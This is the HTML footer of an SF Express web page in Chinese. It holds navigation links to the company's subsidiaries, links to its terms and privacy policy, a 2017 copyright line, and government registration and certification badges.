				<li class="list1" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat 0px 0px;">
				<a aria-label="顺丰科技有限公司" href="http://www.sf-tech.com.cn/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 139px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list2" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -140px 0px;">
				<a aria-label="数据灯塔" href="http://dengta.sf-express.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 128px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list3" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -269px 0px;">
				<a aria-label="顺丰航空" href="http://www.sf-airlines.com/sfa/zh/index.html" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 139px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list4" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -409px 0px;">
				<a aria-label="顺丰产业园" href="http://www.sf-express.com/cn/sc/industrial_park/about_us/Introduction/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 154px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list5" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -563px 0px;">
				<a aria-label="顺丰丰修" href="https://www.sffix.cn/sffix/home.html?chn=173595CFF4554A79087301422BFE33A1&amp;hmsr=baidu&amp;hmpl=%E5%85%AC%E5%8F%B8&amp;hmcu=%E5%85%AC%E5%8F%B8&amp;hmkw=17&amp;hmci" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 118px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list6" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -682px 0px;">
				<a aria-label="顺丰国际" href="http://intl.sf-express.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 118px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list7" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -801px 0px;">
				<a aria-label="海购丰运" href="http://www.sfbuy.com/index" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 118px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list8" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -920px 0px;">
				<a aria-label="顺丰公益" href="http://www.sfgy.org/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 104px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list9" style="box-sizing: border-box; list-style: none; float: left; border-right: 1px solid rgb(51, 51, 51); line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -1025px 0px;">
				<a aria-label="顺丰一站" href="http://sf-saas.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 134px; margin: 0px auto;" target="_blank">
				</a></li>
				<li class="list10" style="box-sizing: border-box; list-style: none; float: left; line-height: 0; background: url('http://www.sf-express.com/cn/sc/dynamic_function/images/index/bottom-nav-cn.png') no-repeat -1160px 0px;">
				<a aria-label="人才招聘" href="https://hr.sf-express.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block; height: 42px; width: 119px; margin: 0px auto;" target="_blank">
				</a></li>
			</ul>
		</div>
		<div class="fcontainer botlink" style="box-sizing: border-box; width: 1280px; margin: 0px auto; padding: 20px 0px 50px;">
			<div class="clearfix" style="box-sizing: border-box;">
				<ul class="policy" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none; overflow: hidden; float: left;">
					<li style="box-sizing: border-box; list-style: none; float: left;">
					<a href="http://www.sf-express.com/cn/sc/use_clause/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; height: 16px; line-height: 16px; display: inline-block; vertical-align: baseline; padding: 0px 8px 0px 0px; border-right: 1px solid rgb(177, 177, 177);">
					使用条款</a></li>
					<li style="box-sizing: border-box; list-style: none; float: left;">
					<a href="http://www.sf-express.com/cn/sc/services_network/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; height: 16px; line-height: 16px; display: inline-block; vertical-align: baseline; padding: 0px 8px; border-right: 1px solid rgb(177, 177, 177);">
					服务网络</a></li>
					<li style="box-sizing: border-box; list-style: none; float: left;">
					<a href="https://qiao.sf-express.com/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; height: 16px; line-height: 16px; display: inline-block; vertical-align: baseline; padding: 0px 8px; border-right: 1px solid rgb(177, 177, 177);" target="_blank">
					丰桥平台</a></li>
					<li style="box-sizing: border-box; list-style: none; float: left;">
					<a href="http://www.sf-express.com/cn/sc/Privacy_Policy/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; height: 16px; line-height: 16px; display: inline-block; vertical-align: baseline; padding: 0px 8px; border: none;">
					隐私政策</a></li>
				</ul>
				<ul class="copyright" style="box-sizing: border-box; margin: 0px; padding: 0px; list-style: none; float: right; overflow: hidden;">
					<li style="box-sizing: border-box; list-style: none; float: left;">
					<a class="gray nolink" href="javascript:void(0)" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; cursor: default;">
					©&nbsp;2017&nbsp;&nbsp;顺丰速运&nbsp;&nbsp;版权所有&nbsp;&nbsp;&nbsp;&nbsp;</a></li>
					<li style="box-sizing: border-box; list-style: none; float: left;">
					<a href="http://www.miitbeian.gov.cn/" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
					粤&nbsp;&nbsp;ICP&nbsp;&nbsp;备08034243号</a></li>
				</ul>
				<ul class="gov" style="box-sizing: border-box; margin: 0px 10px 0px 0px; padding: 0px; list-style: none; float: right; position: relative; top: -3px;">
					<li style="box-sizing: border-box; list-style: none; display: inline-block; vertical-align: middle;">
					<a class="gov1" href="http://webcert.cnmstl.net/cert/code?sn=c6cc6af3fac440c28901c15a104582fe" oncontextmenu="return false;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block;" target="_blank">
					<img alt="安全网址认证书" src="http://webcert.cnmstl.net/images/cert/code/officialbrand_small_h_img.jpg?sn=c6cc6af3fac440c28901c15a104582fe&amp;t=1476167429157" style="box-sizing: border-box; border: 0px; vertical-align: middle; padding: 0px; margin: 0px; display: block; max-height: 35px;" /></a><span>&nbsp;</span></li>
					<li style="box-sizing: border-box; list-style: none; display: inline-block; vertical-align: middle;">
					<a class="gov2" href="http://www.sznet110.gov.cn/webrecord/innernet/Welcome.jsp?bano=4403101900826" oncontextmenu="return false;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block;" target="_blank">
					<img alt="安全认证" src="http://www.sf-express.com/.gallery/other/security_site_1.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; padding: 0px; margin: 0px; display: block; max-height: 35px;" /></a><span>&nbsp;</span></li>
					<li style="box-sizing: border-box; list-style: none; display: inline-block; vertical-align: middle;">
					<a class="gov3" href="http://www.sznet110.gov.cn/index.jsp" oncontextmenu="return false;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block;" target="_blank">
					<img alt="公安网认证" src="http://www.sf-express.com/.gallery/other/security_site_2.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; padding: 0px; margin: 0px; display: block; max-height: 35px;" /></a><span>&nbsp;</span></li>
					<li style="box-sizing: border-box; list-style: none; display: inline-block; vertical-align: middle;">
					<a class="gov4" href="https://szcert.ebs.org.cn/B943BEFD-EF5E-4747-AD73-B875A1FC5CC7" oncontextmenu="return false;" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px; display: inline-block;" target="_blank">
					<img alt="深圳市市场监督管理局企业主体身份公示" src="http://szcert.ebs.org.cn/Images/govIcon.gif" style="box-sizing: border-box; border: 0px; vertical-align: middle; padding: 0px; margin: 0px; display: block; max-height: 35px;" title="深圳市市场监督管理局企业主体身份公示" /></a></li>
				</ul>
			</div>
			<div class="text-right" style="box-sizing: border-box; text-align: right;">
				<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44030502003091" style="box-sizing: border-box; background: 0px 0px; color: rgb(177, 177, 177); text-decoration: none; font-size: 14px;" target="_blank">
				<img src="http://www.sf-express.com/.gallery/other/security_site_3.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; padding: 0px; margin: 0px; display: inline-block;" /><span style="box-sizing: border-box;">粤公网安备 
				44030502003091号</span></a></div>
		</div>
	</div>
</div>

</body>

</html>
